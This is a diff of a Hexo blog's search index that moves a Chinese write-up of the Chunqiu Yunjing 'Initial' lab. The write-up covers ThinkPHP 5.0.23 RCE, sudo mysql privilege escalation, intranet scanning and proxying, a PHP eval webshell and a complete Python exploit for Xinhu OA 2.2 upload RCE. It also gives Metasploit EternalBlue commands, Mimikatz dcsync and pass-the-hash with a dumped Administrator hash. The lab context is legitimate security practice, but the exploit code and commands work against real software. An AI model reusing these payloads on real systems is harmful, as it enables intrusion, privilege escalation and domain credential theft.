@@ -1,76 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>春秋云镜-Initial</title>
-    <url>/posts/536e.html</url>
-    <content><![CDATA[flag1:fscan扫一下，发现有thinkphp的洞
-
-thinkphp-rcethinkphpGUI嗦一下，发现是ThinkPHP 5.0.23 RCE
-
-蚁剑连接，找到flag的位置，但是权限不够
-
-检验一下，发现是www-data权限，然后sudo -l看一下可以用sudo执行的命令
-User www-data may run the following commands on ubuntu-web01:    (root) NOPASSWD: /usr/bin/mysql
-
-
-sudo提权-mysql可以用数据库执行命令sudo mysql -e &#39;\!&#39;拿到第一段flag
-
-ifconfig发现内网网段为172.22.1.*，然后上传fscan去扫内网(记得要给fscan可执行权限)
-flag2:先来整理一下
-MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1	已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
-
-
-
-搭建内网代理：为了访问到内网，我们要先搭建内网代理，此处用stowaway搭建，并且socket监听一个端口
-
-然后用proxifier连接代理，注意修改rule里的target_hosts
-
-连接完成后，即可访问
-
-这里是弱口令admin123
-信呼OA2.2-RCE查询漏洞发现信呼2.2版本是存在文件上传漏洞的，首页通知中也有说明版本为2.2
-
-找了篇文章来打：[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客
-1.php：记得改为POST
-&lt;?php eval($_POST[&quot;1&quot;]);?&gt;
-
-
-
-exp.py：修改URL和adminuser及adminpass
-import requests  session = requests.session() url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27; data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;&#125;  r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;) filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;id = r.json()[&#x27;id&#x27;] url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27; r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)
-
-
-
-由于此时本机已经用proxifier连接了代理，所以本地直接运行也是可以的
-我这里在kali里运行，先配置proxychains，写入socket5 vps地址
-proxychains python exp.py
-
-
-此时访问发现存在：
-
-直接蚁剑连接即可，找到第二段flag
-
-flag3:再来回顾一下：
-MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统 			       已穿http://172.22.1.15poc-yaml-thinkphp5023-method-rce poc1		 已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
-
-那么接下来对172.22.1.21下手，MS17-010即永恒之蓝，可以直接用msf一把梭（我用的kali的）
-proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21run
-
-
-此时就是一个系统权限
-
-然后就要尝试抓取用户的哈希进行PTH
-dcsync先用load kiwi加载Mimikatz
-然后在获取权限的域成员主机上执行kiwi_cmd lsadump::dcsync /domain:xiaorang.lab  /all /csv
-
-得到Administrator的哈希：10cf89a850fb1cdbe6bb432b859164c8
-PTH进行哈希传递
-
-发现传递成功，接下来即可执行命令拿flag了
-
-]]></content>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/posts/3eeb.html</url>
     <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
@@ -87,6 +17,11 @@ Deploy to remote sites$ hexo deploy
 
 More info: Deployment
 ]]></content>
+  </entry>
+  <entry>
+    <title>l3akCTF</title>
+    <url>/posts/cf46.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>初识内网渗透</title>
@@ -227,6 +162,76 @@ find / -user root -perm -4000 -exec ls -lab &#123;&#125; \; 2&gt;/dev/null
 
 利用误配置的crontab任务
 
+
+]]></content>
+  </entry>
+  <entry>
+    <title>春秋云镜-Initial</title>
+    <url>/posts/536e.html</url>
+    <content><![CDATA[flag1:fscan扫一下，发现有thinkphp的洞
+
+thinkphp-rcethinkphpGUI嗦一下，发现是ThinkPHP 5.0.23 RCE
+
+蚁剑连接，找到flag的位置，但是权限不够
+
+检验一下，发现是www-data权限，然后sudo -l看一下可以用sudo执行的命令
+User www-data may run the following commands on ubuntu-web01:    (root) NOPASSWD: /usr/bin/mysql
+
+
+sudo提权-mysql可以用数据库执行命令sudo mysql -e &#39;\!&#39;拿到第一段flag
+
+ifconfig发现内网网段为172.22.1.*，然后上传fscan去扫内网(记得要给fscan可执行权限)
+flag2:先来整理一下
+MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1	已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
+
+
+
+搭建内网代理：为了访问到内网，我们要先搭建内网代理，此处用stowaway搭建，并且socket监听一个端口
+
+然后用proxifier连接代理，注意修改rule里的target_hosts
+
+连接完成后，即可访问
+
+这里是弱口令admin123
+信呼OA2.2-RCE查询漏洞发现信呼2.2版本是存在文件上传漏洞的，首页通知中也有说明版本为2.2
+
+找了篇文章来打：[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客
+1.php：记得改为POST
+&lt;?php eval($_POST[&quot;1&quot;]);?&gt;
+
+
+
+exp.py：修改URL和adminuser及adminpass
+import requests  session = requests.session() url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27; data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;&#125;  r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;) filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;id = r.json()[&#x27;id&#x27;] url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27; r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)
+
+
+
+由于此时本机已经用proxifier连接了代理，所以本地直接运行也是可以的
+我这里在kali里运行，先配置proxychains，写入socket5 vps地址
+proxychains python exp.py
+
+
+此时访问发现存在：
+
+直接蚁剑连接即可，找到第二段flag
+
+flag3:再来回顾一下：
+MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统 			       已穿http://172.22.1.15poc-yaml-thinkphp5023-method-rce poc1		 已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
+
+那么接下来对172.22.1.21下手，MS17-010即永恒之蓝，可以直接用msf一把梭（我用的kali的）
+proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21run
+
+
+此时就是一个系统权限
+
+然后就要尝试抓取用户的哈希进行PTH
+dcsync先用load kiwi加载Mimikatz
+然后在获取权限的域成员主机上执行kiwi_cmd lsadump::dcsync /domain:xiaorang.lab  /all /csv
+
+得到Administrator的哈希：10cf89a850fb1cdbe6bb432b859164c8
+PTH进行哈希传递
+
+发现传递成功，接下来即可执行命令拿flag了
 
 ]]></content>
   </entry>
